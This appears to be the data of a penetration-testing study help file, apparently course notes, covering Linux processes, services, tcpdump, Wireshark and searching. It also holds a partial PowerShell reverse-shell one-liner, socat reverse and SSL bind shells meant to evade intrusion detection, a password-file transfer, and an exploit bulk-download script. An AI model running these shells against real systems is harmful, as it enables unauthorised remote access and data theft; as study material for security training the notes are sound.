(New-Object -TypeName   System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data   2&gt;&amp;1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'&gt;   \';$sendbyte =   ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()\"\n\r    kali@attacker:~$ nc -nv 10.11.0.22   443\n\r","PowerShell","topics\\PowerShell.htm","      ps     lists the processes started by the       current user                ps aux      all processes running on the system for       all users                 ps aux | grep process_name               filtering a ps search to find a       particular process                 top     lists processes by resources used       refreshes the list every 10 sec                   at (7:20pm 06/25/2020)(now +       20 minutes/hours/days/weeks)          when you enter the at daemon with the       specified time, you get an at &gt; prompt, where you enter the cmd to be       executed at the specified time                                    watch -n 5 command        will run the command once every 5       second             Setting Priority\n\r\n\rThe value of niceness determines how nice a process is to others. The default value is zero. Higher the value (+19 max) more the niceness and least likely to receive priority. (-20 min) = (most likely to receive priority)\n\r\n\r      nice -n -10 /bin/slowprocess        starts a process with a nice value decreases by 10, thus increasing       its priority                      nice -n 10 /bin/slowprocess        starts a process with a nice value increased by 10, thus decreasing       its priority                       renice 10 6969       reassign an absolute nice value to an already running process using       its PID                   \n\r\n\rReassign a nice value with top : top &gt; press R &gt; type PID &gt; enter &gt; type nice valueKilling Processes\n\r\n\r        1    SIGHUP&nbsp;    Hangup signal stops the process and restarts with the same   PID&nbsp;      3    SIGQUIT&nbsp;    Core dump, stops the process and saves its info in the current working       directory as file named core&nbsp;      15    SIGTERM&nbsp;    Termination signal, default kill signal&nbsp;&nbsp;      9    SIGKILL&nbsp;    Absolute kill signal, forces the process to stop by sending the       process\'s resources to a special device, /dev/null&nbsp;\n\r    kill -9 6969 :   if you don\'t provide the signal number, it defaults to   SIGTERM    killall -9   process_name : killall if you don\'t know the PID (Process ID -   Unique for every process)    top &gt; press K &gt; PID &gt; enter &gt; signal   number\n\rBack &amp; Foreground Processes\n\r\n\rWhen you run a cmd in terminal, you have to wait for it to finish before you can enter a new cmd. Running a cmd in background allows you to run another cmd simultaneously.      ping -c 488 localhost &gt;       ping_resutts.txt &amp;           to run a cmd in background just add a       &amp; symbol at the end.                      Ctrl+Z &gt; bg %2        suspend a running job and move it to the       bg using JobID. If no %ID is given, it runs current job in the bg.                                    jobs     lists jobs running in the current       terminal               fg %2      to bring a job into foreground using       JobID             ","Process","topics\\Process.htm","TCP\n\r\n\r\n\r  All packets sent and received   after the initial 3-way handshake will have the ACK flag set.\n\r  The PSH flag is used to   enforce immediate delivery of a packet and is commonly used in interactive   Application Layer protocols to avoid buffering. \n\r","Protocol","topics\\Protocol.htm","#!/bin/bash&nbsp;# Using SearchSploit to search thru an offline copy of Exploit Database, -w to return the URL, -t to search the exploit title# Arg (3) = exploit name to search&nbsp;for e in $(searchsploit $1 $2 $3 -w -t | grep http | cut -f 2 -d \"|\")do &nbsp; exp_name=$(echo $e | cut -d \"/\" -f 5)&nbsp; url=$(echo $e | sed \'s/exploits/raw/\')&nbsp; wget -q --no-check-certificate $url -o $exp_namedone","Search & Download Exploit","topics\\Search_&_Download_Exploit.htm","      ls --help (or) -h        accessing help file           man ls      accessing manual page           apropos pass (or) man -k pass          look for commands that have ‘pass’ as part of their description                         man 5 passwd       access the 5 section of passwd               locate apache2      locate every occurrence of that word, it uses a database                    updatedb     updates the database           whereis apache2      location of the binary file and man page                which apache2      searches directories in $PATH env for binary file                find / -name apache2.*        find file with name apache2 (any extension) in the root directory       (/)                    find ?at      find 3 letter named files ending with at                find *at      find any file ending with at            ","Searching","topics\\Searching.htm","\n\r\n\r          sudo systemctl start       ssh          start       ssh&nbsp;      sudo ss -antlp | grep       sshd&nbsp;    verify that ssh is running&nbsp;      sudo systemctl enable       ssh&nbsp;    start ssh on boot&nbsp;      sudo systemctl stop       ssh&nbsp;    stop ssh&nbsp;             \n\r\n\rUse apache2 for HTTP service\n\r\n\r        systemctl       list-unit-files&nbsp;    get a list of all the services&nbsp;HTTP Service\n\r    Default Apache document root is at /var/www/html\n\r    To change the index page echo \"homepage\" &gt;   /var/www/html/index.html\n\r","Services","topics\\Services.htm","\n\r\n\rEstablishes two bidirectional byte streams and transfers data between them.\n\r\n\r        socat - TCP4:10.11.0.22:110&nbsp;    connect to a remote server (10.11.0.22) on       port 110, TCP4 (IPv4), (-) to transfer data between STDIO and the remote       host (allowing our keyboard interaction with the shell)&nbsp;      sudo socat TCP4-LISTEN:443 STDOUT&nbsp;    &nbsp;create a listener on port   443Transfer Files\n\r\n\r        kali@linux:~$ sudo socat       TCP4-LISTEN:443, fork file:secret_passwords.txt           &nbsp;    create a listener on       kali, fork creates a child process once connection is made, file to       specify the name of the file to be transfered&nbsp;      c:\\win&gt; socat       TCP4:10.11.0.4:443     file:received_secret_passwords.txt,create         &nbsp;    connect to kali and       download the file, create specifies that a new file with the mentioned       name will be created&nbsp;Reverse Shell\n\r\n\r        c:\\atk&gt; socat -d -d TCP4-LISTEN:443       STDOUT&nbsp;    win attacker runs a listener, -d -d to       increase verbosity&nbsp;      kali@trgt:~$ socat TCP4:10.11.0.22:443       EXEC:/bin/bash&nbsp;    linux target connects to the attacker and       after connection win is presented with kali bash shell&nbsp;Encryted Bind Shell\n\r\n\rSecure Socket Layer (SSL) certificate encryption will assist in evading intrusion detection systems (IDS) and hide the sensitive data transceiving.\n\r\n\r        openssl req -newkey rsa:2048 -nodes -keyout       bind_shell.key -x509 -days 362 -out bind_shell.crt&nbsp;          openssl       to create a self-signed certificate      \n\r                req: initiate a new certificate signing request                -newkey: generate a new private key                rsa:2048: use RSA encryption with a 2,048-bit key         length.                -nodes: store the private key without passphrase         protection                -keyout: save the key to a file                -x509: output a self-signed certificate instead of a certificate         request                -days: set validity period in days                -out: save the certificate to a file\n\r      cat       bind_shell.key bind_shell.crt &gt; bind_shell.pem&nbsp;    combine the key and crt files into a single       .pem file&nbsp;       kali@trgt:~$ sudo       socatOPENSSL-LISTEN:443,cer=bind_shell.pm,verify=0,fork       EXEC:/bin/bash&nbsp;    verify=0 to disable SSL   verification&nbsp;      c:\\atk&gt; socat -       OPENSSL:10.11.0.4:443,verify=0&nbsp;    &nbsp;","Socat","topics\\Socat.htm","\n\r\n\rAdvanced Package Tool (ATP)    is used to manage packages on Debain-based system       \n\r\n\r        sudo apt     update          update       the locally cached info about the ATP packages&nbsp;      sudo apt       upgrade          upgrade       the installed packages&nbsp;      apt-cache search       app_name&nbsp;    search cached database to find whether the application&nbsp;      apt show       app_name&nbsp;    show info about the package&nbsp;      sudo apt install       app_name&nbsp;    to install the package and its dependencies&nbsp;      sudo apt remove --purge       app_name&nbsp;    remove a package completely&nbsp;Adding Repositories\n\r    The servers that hold the software for   particular distributions of Linux are known as   repositories.\n\r    The repositories your system will search for   software are stored in the sources.list file at   /etc/apt/sources.list\n\r    To add a   repository, just edit the sources.list file by adding the name of the   repository to the list and then save the file.\n\rGithub\n\r    git clone   github_url_of_software : copies all   the data and files from that location onto your system\n\r\n\r\n\rdkpg is the core tool to install .deb file\n\r\n\r        sudo dpkg -i       filename.deb    install a package      dpkg     -l&nbsp;    output a list of all installed packages&nbsp;&nbsp;      dpkg -L       package_name&nbsp;    files installed and path details for a given   package&nbsp;","Software Management","topics\\Software_Management.htm","#!/bin/bash&nbsp;# www.churchofsatan.com# Arg 1 ($1) = chruchofsatan# Arg 2 ($2) = com&nbsp;# Download the index.html pagewget www.$1.$2&nbsp;# Carves out URL-referenced \".$1.$2\" subdomainsgrep -o \"[^/]*\\.$1\\.$2\" index.html | sort -u &gt; domain_list.txt&nbsp;# Look for IP addresses of each domain name using the host command &amp; extract IP addresses onlyfor url in $(cat domain_list.txt); do host $url; done | grep \"has address\" | cut -d \" \" -f 4 | sort -u &gt; IP_list.txt","Subdomain & IP in HTML","topics\\Subdomain_&_IP_in_HTML.htm","\n\r\n\rCommand-line packet analyzer which can both capture traffic from the network and read existing capture filesFiltering Traffic      sudo tcpdump -r       passwd_crack_filter.pcap        -r to open a pcap (packet capture) file                      sudo tcpdump -n -r       passwd_crack_filter.pcap | awk -F\" \" \'{print $3}\' | sort | uniq - c | head                                   -n       to skip DNS name lookups      filter       and sort by most common IP &amp; port         sudo tcpdump -n src host       172.16.40.10 -r passwd_crack_filter.pcap            source host to output traffic       originating from a given host                  sudo tcpdump -n dst host       172.16.40.10 -r passwd_crack_filter.pcap            destination host to output traffic       destined for specific host                 sudo tcpdump -n port 81 -r       passwd_crack_filter.pcap           filter traffic by port number includes       both src and dst against the port                     sudo tcpdump -nX -r       passwd_crack_filter.pcap | less           -x to print the packet data in both HEX       and ASCll format                  Advanced Header Filtering\n\r\n\rHTTP requests and responses have TCP flags PSH and ACK enabled\n\r\n\r      echo \"$((2#00011000))\"          convert the 14th byte (00011000) into       decimal (24)               sudo tcpdump -A -n \'tcp[13] =  24\' -r passwd_crack_filter.pcap                \n\r                to see packets only with the HTTP requests and responses data                         ACK and PSH bits set are represented by the fourth and fifth bits         ( 00011000 or 24) of the 14th byte (starts at zero so 13) of the TCP         header                -A to print in ASCII\n\r      ","Tcpdump","topics\\Tcpdump.htm","      hostname     display hostname of the system.             passwd     change password of current user             passwd username      setting another user\'s password as root              useradd username      adding a user as root             userdel username      removing a user as root, use -r to remove its home folder                      groups username      listing grps a user is in               whoami     username of the users logged in at the terminal                 who     list of all the users currently logged in as a user.                   w     display current system status, time, duration, list of users       currently logged in on system and otheruser information                         last     who recently used the system             lastb     shows all bad login attempts into the system              ","User","topics\\User.htm","Launching\n\r  sudo   wireshark\n\rCapture Filters\n\r    Capture &gt; Capture   filters to choose from predefined filters\n\r    net   10.11.1.0/24 using the net filter to only capture traffic on the   10.11.1.0/24 address range\n\r    start the capture by selecting the network interface\n\rDisplay Filters\n\r    Analyze &gt; Display   filters to choose from predefied list\n\r    tcp.port == 21   to display only tcp traffic on port 21 (used by FTP)\n\rFollow TCP Stream\n\r    Display the client-server communication in plaintext works on web   traffic, nc (shells, mail, unencrypted connections), ftp\n\r    Right-click a packet &gt; Follow   &gt; TCP Stream\n\r","Wireshark","topics\\Wireshark.htm");